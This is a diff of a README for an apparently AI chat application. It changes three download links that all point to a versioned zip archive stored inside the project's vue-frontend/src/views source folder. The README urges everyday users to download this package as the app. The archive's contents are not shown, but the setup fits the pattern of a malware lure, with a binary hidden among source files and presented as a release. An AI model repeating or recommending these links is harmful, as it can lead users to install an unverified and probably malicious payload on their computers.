@@ -1,6 +1,6 @@
 # 🤖 AI-Conversational-Application-Service-Platform - Simple AI chat for daily use
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/raw/refs/heads/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip)
 
 ## 🧭 What this app does
 
@@ -32,7 +32,7 @@ For best results:
 
 Visit this page to download:
 
-https://raw.githubusercontent.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip
+https://github.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/raw/refs/heads/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip
 
 If the page shows a release file, download it to your PC. If the page shows a setup package or app file, save it in a folder you can find later, such as Downloads or Desktop.
 
@@ -163,7 +163,7 @@ Yes. The project supports secondary development for custom needs.
 ### Where do I get the app?
 Use the download page here:
 
-https://raw.githubusercontent.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip
+https://github.com/Reboundmilk402/AI-Conversational-Application-Service-Platform/raw/refs/heads/main/vue-frontend/src/views/Platform-Service-A-Application-Conversational-1.1-beta.5.zip
 
 ### What if I do not see a release file?
 Look for the main download content on the page, then save the app file to your PC
